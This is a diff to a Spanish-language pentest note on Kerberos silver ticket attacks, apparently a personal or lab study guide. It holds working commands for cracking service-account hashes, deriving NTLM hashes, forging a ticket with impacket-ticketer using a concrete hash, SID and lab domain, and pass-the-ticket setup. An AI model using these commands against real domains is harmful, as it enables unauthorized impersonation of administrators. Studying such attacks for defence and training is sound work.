@@ -17,20 +17,11 @@ Para realizar un ataque de *silver ticket*, necesitas lo siguiente:
 
 1. **Obtener el hash NTLM de la cuenta de servicio**:
    - Sin permisos de administrador, puedes intentar obtener el hash NTLM de la cuenta de servicio mediante técnicas como:
-     - **Kerberoasting**: Solicita tickets de servicio (TGS) para cuentas con SPN y extrae el hash.
+     - **Kerberoasting**: [articulo acá](./kerberoasting.md)
+     - Si conocemos la contraseña en texto plano podemos generar el hash NTLM: [versión web](https://codebeautify.org/ntlm-hash-generator)
        ```bash
-       GetUserSPNs.py -dc-ip <DC_IP> <DOMINIO>/<USUARIO>:<CONTRASEÑA> -request
+       echo -n "<CONTRASEÑA>" | iconv -t UTF16LE | openssl dgst -md4
        ```
-       - Esto devuelve tickets cifrados que puedes crackear con herramientas como `hashcat` para obtener el hash NTLM.
-       - Ejemplo:
-         ```bash
-         GetUserSPNs.py -dc-ip 192.168.1.10 example.com/usuario:contraseña -request
-         ```
-       - Usa `hashcat` para crackear el hash:
-         ```bash
-         hashcat -m 13100 <TGS_HASH> /ruta/a/wordlist.txt
-         ```
-
 2. **Obtener el SID del dominio**:
    - Usa `ldapsearch` o herramientas de enumeración como `rpcclient` con credenciales de usuario estándar.
      ```bash
@@ -88,14 +79,15 @@ Para realizar un ataque de *silver ticket*, necesitas lo siguiente:
        - `<USUARIO_OBJETIVO>`: El usuario a impersonar (por ejemplo, `Administrator`).
      - Ejemplo:
        ```bash
-       python3 ticketer.py -nthash aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-123456789-987654321-123456789 -domain example.com -spn MSSQLSvc/sqlserver.example.com:1433 -user-id 1105 Administrator
+       impacket-ticketer -nthash e3a0168bc21cfb88b95c954a5b18f57c -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya-industries.com -user-id 500 Administrator
        ```
+    - El user id 500 es el RID de la cuenta de administrador.
      - Esto genera un archivo `.ccache` con el ticket forjado.
 
 2. **Configurar la variable de entorno para el ticket Kerberos**:
    - Exporta el ticket para usarlo con otras herramientas de Impacket.
      ```bash
-     export KRB5CCNAME=/ruta/al/ticket.ccache
+     export KRB5CCNAME={PWD}/<nombre_ticket>.ccache
      ```
 
 3. **Realizar Pass-the-Ticket (PTT)**:
